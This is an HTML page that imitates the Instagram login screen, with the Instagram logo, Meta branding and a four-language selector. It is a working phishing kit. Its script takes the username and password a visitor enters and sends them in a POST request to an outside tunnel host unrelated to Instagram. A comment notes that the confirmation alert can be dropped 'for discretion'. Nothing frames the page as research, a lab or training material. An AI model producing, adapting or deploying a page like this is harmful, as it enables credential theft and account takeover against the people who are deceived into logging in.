<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background:
                radial-gradient(circle at top left, #44235c, transparent 35%),
                radial-gradient(circle at bottom right, #155c4d, transparent 35%),
                #15293a;
            color: #fff;
        }
        .container {
            width: 360px;
            padding: 25px;
            text-align: center;
        }
        .language select {
            background: transparent;
            border: none;
            color: #ddd;
            font-size: 18px;
            outline: none;
            margin-bottom: 50px;
        }
        .logo img {
            width: 85px;
            margin-bottom: 55px;
        }
        .input {
            width: 100%;
            height: 58px;
            padding: 18px;
            margin-bottom: 15px;
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, .15);
            background: #1d2d3a;
            color: #fff;
            font-size: 17px;
        }
        .input::placeholder {
            color: #9ca5af;
        }
        .login {
            width: 100%;
            height: 55px;
            border: none;
            border-radius: 30px;
            background: #1877F2;
            color: #fff;
            font-size: 23px;
            cursor: pointer;
            margin-top: 5px;
        }
        .login:hover {
            background: #0f67dc;
        }
        .forgot {
            display: block;
            margin-top: 25px;
            color: white;
            text-decoration: none;
            font-size: 18px;
        }
        .bottom {
            margin-top: 160px;
        }
        .create {
            width: 100%;
            height: 55px;
            border-radius: 30px;
            background: transparent;
            border: 2px solid #3b82ff;
            color: #3b82ff;
            font-size: 20px;
            cursor: pointer;
        }
        .meta {
            margin-top: 30px;
            font-size: 32px;
        }
        .meta span {
            font-size: 22px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="language">
            <select id="language" onchange="changeLanguage()">
                <option value="en">English (US)</option>
                <option value="pt">Português (Brasil)</option>
                <option value="es">Español</option>
                <option value="fr">Français</option>
            </select>
        </div>

        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
        </div>

        <input id="user" class="input" placeholder="Username, email or mobile number">
        <input id="pass" class="input" type="password" placeholder="Password">

        <button id="login" class="login">Log in</button>

        <a id="forgot" class="forgot" href="#">Forgot password?</a>

        <div class="bottom">
            <button id="create" class="create">Create new account</button>
            <div class="meta">∞ <span>Meta</span></div>
        </div>
    </div>

    <script>
        // Traduções
        const lang = {
            en: {
                user: "Username, email or mobile number",
                pass: "Password",
                login: "Log in",
                forgot: "Forgot password?",
                create: "Create new account"
            },
            pt: {
                user: "Nome de usuário, email ou celular",
                pass: "Senha",
                login: "Entrar",
                forgot: "Esqueceu a senha?",
                create: "Criar nova conta"
            },
            es: {
                user: "Usuario, correo o teléfono",
                pass: "Contraseña",
                login: "Iniciar sesión",
                forgot: "¿Olvidaste tu contraseña?",
                create: "Crear cuenta"
            },
            fr: {
                user: "Nom d'utilisateur, e-mail ou téléphone",
                pass: "Mot de passe",
                login: "Se connecter",
                forgot: "Mot de passe oublié ?",
                create: "Créer un compte"
            }
        };

        function changeLanguage() {
            let l = document.getElementById("language").value;
            document.documentElement.lang = l;
            document.getElementById("user").placeholder = lang[l].user;
            document.getElementById("pass").placeholder = lang[l].pass;
            document.getElementById("login").innerText = lang[l].login;
            document.getElementById("forgot").innerText = lang[l].forgot;
            document.getElementById("create").innerText = lang[l].create;
        }

        // Envio do login ao clicar em "Entrar"
        document.getElementById("login").addEventListener("click", async () => {
            const username = document.getElementById("user").value.trim();
            const password = document.getElementById("pass").value;

            if (!username || !password) {
                alert("Preencha todos os campos.");
                return;
            }

            try {
                const response = await fetch("https://81d62583b7d67482-177-37-186-14.serveousercontent.com/login", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();
                console.log("Resposta:", data);
                alert("Login enviado!"); // Pode remover se quiser discrição
            } catch (error) {
                console.error("Erro:", error);
            }
        });
    </script>
</body>
</html>
